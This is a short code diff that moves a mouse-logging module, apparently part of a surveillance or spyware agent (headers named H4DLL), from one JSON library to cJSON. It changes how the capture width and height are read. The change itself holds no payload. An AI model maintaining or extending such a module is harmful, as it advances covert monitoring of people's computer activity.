@@ -2,7 +2,7 @@
 
 #include <Windows.h>
 #include <Windowsx.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include <time.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
@@ -50,10 +50,12 @@ DWORD WINAPI PM_MouseLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_MouseLogInit(JSONObject elem)
+DWORD WINAPI PM_MouseLogInit(cJSON *elem)
 {
-	mouse_x_cap = (DWORD) elem[L"width"]->AsNumber();
-	mouse_y_cap = (DWORD) elem[L"height"]->AsNumber();
+	cJSON* width = cJSON_GetObjectItem(elem, "width");
+	cJSON* height = cJSON_GetObjectItem(elem, "height");
+	mouse_x_cap = (DWORD)cJSON_GetNumberValue(width);
+	mouse_y_cap = (DWORD) cJSON_GetNumberValue(height);
 
 	return 1;
 }
